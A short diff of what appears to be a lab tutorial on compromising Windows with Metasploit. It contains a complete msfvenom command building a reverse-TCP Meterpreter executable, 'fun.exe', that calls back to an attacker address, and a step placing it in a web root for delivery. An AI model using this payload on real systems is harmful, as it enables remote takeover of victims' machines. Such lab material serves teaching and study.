@@ -11,7 +11,7 @@ To Compromise windows using Metasploit .
 Find the attackers ip address using ifconfig
 ![](1.png)
 
-Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.
 ![](2.png)
 
 copy the fun.exe into the apache /var/www/html folder
